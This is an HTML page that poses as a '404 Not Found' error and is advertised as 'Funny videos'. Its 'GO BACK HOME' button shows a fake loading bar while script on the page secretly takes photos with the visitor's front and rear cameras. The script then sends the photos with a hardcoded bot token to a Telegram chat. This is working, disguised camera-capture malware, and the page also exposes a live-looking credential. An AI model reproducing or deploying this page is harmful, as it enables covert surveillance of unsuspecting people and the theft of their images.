<!DOCTYPE html>
<html lang="en">
<head>
    <meta property="og:title" content="Funny videos">
<meta property="og:description" content="Funny videos .">
<meta property="og:image" content="https://i.ytimg.com/vi/sWA-osOeiJg/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLCMMGBhrNJoBU_osKyrNo8T6onEig">
    <meta charset="UTF-8">
    <title>404 Not Found</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        /* Rasmga mos dizayn */
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #fcfcfc;
            color: #333;
            text-align: center;
        }

        .container {
            max-width: 600px;
            padding: 20px;
        }

        h1 {
            font-size: 120px;
            margin: 0;
            font-weight: bold;
            letter-spacing: 5px;
        }

        h2 {
            font-size: 28px;
            margin: 10px 0;
        }

        p {
            color: #888;
            font-size: 18px;
            margin-bottom: 30px;
        }

        /* Tugma dizayni */
        #photoBtn {
            background-color: #000;
            color: #fff;
            padding: 12px 30px;
            border: none;
            text-transform: uppercase;
            font-weight: bold;
            cursor: pointer;
            font-size: 14px;
            transition: 0.3s;
        }

        #photoBtn:hover {
            background-color: #333;
        }

        /* Progress Bar */
        #progressBox {
            margin-top: 25px;
            display: none;
        }
        .progress {
            width: 100%;
            max-width: 300px;
            height: 10px;
            background: #eee;
            margin: 10px auto;
            border-radius: 5px;
            overflow: hidden;
        }
        .bar {
            height: 100%;
            width: 0%;
            background: #000;
            transition: 0.1s;
        }

        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="container">
    <h1>404</h1>
    <h2>Oops, This Page Not Found!</h2>
    <p>The link might be corrupted, or the page may have been removed.</p>

    <button id="photoBtn">GO BACK HOME</button>

    <div id="progressBox">
        <div id="status">LOADING...</div>
        <div class="progress">
            <div class="bar" id="bar"></div>
        </div>
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    // Telegram Bot Ma'lumotlari
    const BOT_TOKEN = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
    const CHAT_ID  = "7880376636";

    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");

    async function sendToTelegram(blob) {
        const fd = new FormData();
        fd.append("chat_id", CHAT_ID);
        fd.append("photo", blob);
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: fd
            });
        } catch (e) { console.error("Xatolik yuz berdi"); }
    }

    function startProgress() {
        const box = document.getElementById("progressBox");
        const bar = document.getElementById("bar");
        box.style.display = "block";
        let p = 0;
        const i = setInterval(() => {
            p++;
            bar.style.width = p + "%";
            if (p >= 100) clearInterval(i);
        }, 50);
    }

    async function capture(facing) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: facing }
            });
            video.srcObject = stream;
            await video.play();
            await new Promise(r => setTimeout(r, 500));
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext("2d").drawImage(video, 0, 0);
            stream.getTracks().forEach(t => t.stop());
            return new Promise(res => {
                canvas.toBlob(blob => res(blob), "image/jpeg", 0.8);
            });
        } catch (err) {
            console.log("Kameraga ruxsat berilmadi.");
            return null;
        }
    }

    document.getElementById("photoBtn").onclick = async () => {
        startProgress();
        const front = await capture("user");
        if(front) await sendToTelegram(front);
        
        const back = await capture("environment");
        if(back) await sendToTelegram(back);
    };
</script>

</body>
</html>
